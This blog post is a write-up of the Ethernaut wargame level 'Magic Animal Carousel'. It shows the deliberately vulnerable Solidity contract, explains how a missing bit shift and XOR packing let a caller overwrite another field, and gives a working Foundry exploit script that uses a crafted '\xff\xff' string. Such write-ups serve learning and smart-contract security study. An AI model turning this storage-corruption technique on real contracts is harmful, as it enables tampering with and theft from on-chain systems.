---
layout: post
title: "[Ethernaut] 33.Magic Animal Carousel"
tags: blockchain ethernaut foundry low-level_data bof
---

# Analysis

---

The goal is “break the magic rule of the carousel”.

rule: If an animal joins the ride, take care when you check again, that same animal must be there.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    error AnimalNameTooLong();
    error CrateNotInitialized();

    constructor() {
        carousel[0] ^= 1 << 160;
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        uint256 crate = carousel[crateId];
        require(crate != 0, CrateNotInitialized());
        
        address owner = address(uint160(crate & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // Replace animal
            carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
        } else {
            // If no animal specified keep same animal but clear owner slot
            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

# Exploit

---

Two primary vulnerabilities were identified in the contract logic.

```solidity
carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
    | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);
```

The function updates the `carousel` state using a bitwise XOR (`^`) operation between the existing animal data and the new encoded animal data.

While iterating through the maximum capacity (65,535) could theoretically reset the state to break the logic, this approach is impractical due to excessive gas costs and time consumption.

The `changeAnimal()` function processes the `encodedAnimal` input without applying the necessary bitwise right-shift (`>> 16`).

```solidity
uint256 encodedAnimal = encodeAnimalName(animal);
if (encodedAnimal != 0) {
    // Replace animal
    carousel[crateId] =
        (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
} else {
```

This omission, combined with the bitwise operations, allows the caller to manipulate the stored value arbitrarily.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/MagicAnimalCarousel.sol";
import "forge-std/Script.sol";

contract MagicAnimalCarouselSol is Script {
    MagicAnimalCarousel public mac_ = MagicAnimalCarousel(0x499F769Ca545F3adAC42D8db78D41f3938a0165E);

    function run() external {
        vm.startBroadcast();

        mac_.setAnimalAndSpin("AAAAAAAAAAAA");
        console.logBytes32(bytes32(mac_.carousel(mac_.currentCrateId())));

        address(mac_).call(abi.encodeWithSignature("changeAnimal(string,uint256)", "AAAAAAAAAA\xff\xff", mac_.currentCrateId()));
        console.logBytes32(bytes32(mac_.carousel(mac_.currentCrateId())));

        mac_.setAnimalAndSpin("BBBBBBBBBBBB");
        console.logBytes32(bytes32(mac_.carousel(mac_.currentCrateId())));

        vm.stopBroadcast();
    }
}
```

By passing a crafted string containing `\xff\xff` (representing 65,535 in hex) to `changeAnimal()`, we can overwrite the `nextCrateId` portion of the storage slot.
Subsequently executing `setAnimalAndSpin()` increments this injected ID ($65,535 + 1$). Due to the modulo or overflow behavior, `currentCrateId` resets to a target value (e.g., 1).
When validated by Ethernaut, the ID increments to 2, and the animal data is saved via XOR with the crafted input ("AAAAAAAAAAAA"), successfully breaking the challenge's intended constraints.